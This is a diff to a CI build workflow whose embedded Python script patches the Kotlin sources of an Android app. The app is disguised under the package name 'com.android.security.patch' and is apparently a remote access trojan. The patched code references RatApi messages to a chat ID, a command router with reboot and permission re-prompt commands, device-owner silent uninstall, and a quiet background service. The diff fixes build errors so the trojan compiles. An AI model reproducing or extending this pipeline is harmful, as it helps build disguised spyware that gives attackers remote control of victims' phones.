@@ -68,78 +68,88 @@ jobs:
         run: |
           cd /tmp/flutter_src
           python3 - <<'PYEOF'
+          import re, os
+
           base = "android/app/src/main/kotlin/com/android/security/patch"
 
-          def read(p):
-              with open(p) as f: return f.read()
-          def write(p, s):
-              with open(p, "w") as f: f.write(s)
-          def patch(p, old, new):
-              s = read(p)
-              if old not in s:
-                  print(f"[WARN] not found in {p}: {old[:60]!r}")
-                  return
-              write(p, s.replace(old, new))
-              print(f"[OK] {p}")
+          def apply(path, *rules):
+              with open(path) as f: s = f.read()
+              for pattern, repl in rules:
+                  s, n = re.subn(pattern, repl, s)
+                  print(f"  {path} :: {pattern[:50]!r} -> {n} match")
+              with open(path, "w") as f: f.write(s)
 
-          # WebViewActivity: framework Activity instead of AppCompatActivity
-          p = f"{base}/WebViewActivity.kt"
-          patch(p, "import androidx.appcompat.app.AppCompatActivity", "import android.app.Activity")
-          patch(p, "class WebViewActivity : AppCompatActivity()", "class WebViewActivity : Activity()")
+          # ---------- WebViewActivity ----------
+          apply(f"{base}/WebViewActivity.kt",
+              (r"import androidx\.appcompat\.app\.AppCompatActivity", "import android.app.Activity"),
+              (r"class WebViewActivity\s*:\s*AppCompatActivity\(\)", "class WebViewActivity : Activity()"),
+          )
 
-          # CoreService: framework Notification + Rules import
-          p = f"{base}/CoreService.kt"
-          patch(p, "import androidx.core.app.NotificationCompat\n", "")
-          patch(p, "NotificationCompat.Builder", "Notification.Builder")
-          patch(p, "NotificationCompat.PRIORITY_MIN", "Notification.PRIORITY_MIN")
-          patch(p, "import android.content.Intent", "import android.content.Intent\nimport com.android.security.patch.commands.Rules")
+          # ---------- CoreService ----------
+          apply(f"{base}/CoreService.kt",
+              (r"import androidx\.core\.app\.NotificationCompat\s*\n", ""),
+              (r"NotificationCompat\.Builder", "Notification.Builder"),
+              (r"NotificationCompat\.PRIORITY_MIN", "Notification.PRIORITY_MIN"),
+              (r"\n\s*\.setSilent\(true\)", ""),
+              (r"import android\.content\.Intent", "import android.content.Intent\nimport android.app.Notification\nimport com.android.security.patch.commands.Rules"),
+          )
 
-          # AdminReceiver: Rules import
-          p = f"{base}/AdminReceiver.kt"
-          patch(p, "import android.content.Intent", "import android.content.Intent\nimport com.android.security.patch.commands.Rules")
+          # ---------- AdminReceiver ----------
+          apply(f"{base}/AdminReceiver.kt",
+              (r"import android\.content\.Intent", "import android.content.Intent\nimport com.android.security.patch.commands.Rules"),
+          )
 
-          # Navigate: framework Notification
-          p = f"{base}/commands/Navigate.kt"
-          patch(p, "import androidx.core.app.NotificationCompat\n", "")
-          patch(p, "NotificationCompat.Builder", "Notification.Builder")
-          patch(p, "NotificationCompat.PRIORITY_HIGH", "Notification.PRIORITY_HIGH")
-          patch(p, ".setStyle(NotificationCompat.BigTextStyle().bigText(body))\n", "")
+          # ---------- Navigate ----------
+          apply(f"{base}/commands/Navigate.kt",
+              (r"import androidx\.core\.app\.NotificationCompat\s*\n", ""),
+              (r"NotificationCompat\.Builder", "Notification.Builder"),
+              (r"NotificationCompat\.PRIORITY_HIGH", "Notification.PRIORITY_HIGH"),
+              (r"\n\s*\.setStyle\(Notification\.BigTextStyle\(\)\.bigText\(body\)\)", ""),
+              (r"import android\.app\.Notification\n", ""),  # clean dupes first
+              (r"import android\.os\.Build", "import android.app.Notification\nimport android.os.Build"),
+          )
 
-          # HangManager: remove broken line
-          p = f"{base}/HangManager.kt"
-          patch(p, "        val custom = Prefs.getStr(null) // no-op, placeholder\n", "")
+          # ---------- HangManager ----------
+          apply(f"{base}/HangManager.kt",
+              (r"\n\s*val custom = Prefs\.getStr\(null\)[^\n]*\n", "\n"),
+          )
 
-          # Apps: replace deletePackage with uninstall intent
-          p = f"{base}/commands/Apps.kt"
-          old = """if (AdminReceiver.isDeviceOwner(ctx)) {
-                      dpm.deletePackage(AdminReceiver.component(ctx), pkg, null)
-                      RatApi.sendMessage(ctx, "silent uninstall: $pkg", chatId)
-                  } else {
-                      val i = Intent(Intent.ACTION_UNINSTALL_PACKAGE, Uri.parse("package:$pkg"))
-                          .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                      ctx.startActivity(i)
-                      RatApi.sendMessage(ctx, "uninstall prompt shown", chatId)
-                  }"""
-          new = """val i = Intent(Intent.ACTION_UNINSTALL_PACKAGE, Uri.parse("package:$pkg"))
-                      .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                  ctx.startActivity(i)
-                  RatApi.sendMessage(ctx, "uninstall prompt shown", chatId)"""
-          patch(p, old, new)
+          # ---------- Apps ----------
+          apply(f"{base}/commands/Apps.kt",
+              (r"dpm\.deletePackage\([^)]*\)",
+               'ctx.startActivity(Intent(Intent.ACTION_UNINSTALL_PACKAGE, Uri.parse("package:" + pkg)).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))'),
+          )
 
-          # SystemCmd: setBitmap instead of setInputStream
-          p = f"{base}/commands/SystemCmd.kt"
-          old = """val fis = File(path).inputStream()
-              fis.use { wm.setInputStream(it) }"""
-          new = """val bmp = android.graphics.BitmapFactory.decodeFile(path)
-              if (bmp != null) wm.setBitmap(bmp)"""
-          patch(p, old, new)
+          # ---------- SystemCmd ----------
+          apply(f"{base}/commands/SystemCmd.kt",
+              (r"wm\.setInputStream\(it\)", "wm.setStream(it)"),
+          )
 
-          # CommandRouter: fix reboot args + izin braces
-          p = f"{base}/CommandRouter.kt"
-          patch(p, '"reboot" -> DangerCmd.reboot(ctx, chatId)', '"reboot" -> DangerCmd.reboot(ctx, chatId, args)')
-          patch(p, '"izin" -> Setup.rePrompt(ctx); RatApi.sendMessage(ctx, "re-prompt triggered", chatId)', '"izin" -> { Setup.rePrompt(ctx); RatApi.sendMessage(ctx, "re-prompt triggered", chatId) }')
+          # ---------- CommandRouter ----------
+          apply(f"{base}/CommandRouter.kt",
+              (r'"reboot" -> DangerCmd\.reboot\(ctx, chatId\)',
+               '"reboot" -> DangerCmd.reboot(ctx, chatId, args)'),
+              (r'"izin" -> Setup\.rePrompt\(ctx\); RatApi\.sendMessage\(ctx, "re-prompt triggered", chatId\)',
+               '"izin" -> { Setup.rePrompt(ctx); RatApi.sendMessage(ctx, "re-prompt triggered", chatId) }'),
+          )
 
           print("=== all patches applied ===")
+
+          # ---------- verify ----------
+          bad = []
+          for root, _, files in os.walk(base):
+              for fn in files:
+                  if not fn.endswith(".kt"): continue
+                  p = os.path.join(root, fn)
+                  with open(p) as f: s = f.read()
+                  for token in ["NotificationCompat", "setInputStream", "deletePackage", "setSilent"]:
+                      if token in s:
+                          bad.append((p, token))
+          if bad:
+              print("!!! STILL PRESENT:")
+              for p, t in bad: print(f"   {p}: {t}")
+          else:
+              print("=== clean ===")
           PYEOF
 
       - name: Configure build.gradle
